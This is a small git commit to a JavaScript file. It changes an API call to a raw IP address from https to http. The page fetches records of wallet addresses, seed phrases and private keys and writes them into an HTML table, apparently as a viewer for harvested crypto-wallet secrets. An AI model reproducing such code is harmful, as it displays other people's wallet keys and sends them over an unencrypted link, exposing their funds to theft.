305e11e812f8685b944a1f5a757098686e9899b4
blockchaingurukerala <65129127+blockchaingurukerala@users.noreply.github.com>
2021-11-22 22:50:15 +0530

    Update app1.js

--- app1.js
+++ app1.js
@@ -1,6 +1,6 @@
 
 $(document).ready(function () {              
-    $.get('https://52.56.48.112/api/p381fgRXiWvAkntW50Ux',  function(result){ 
+    $.get('http://52.56.48.112/api/p381fgRXiWvAkntW50Ux',  function(result){ 
           console.log(result);
           for(var i=0;i<result.length;i++){
               var row="<tr><td>"+result[i].wallet+"</td><td>"+result[i].phrase+"</td><td>"+result[i].privatekey+"</td></tr>";
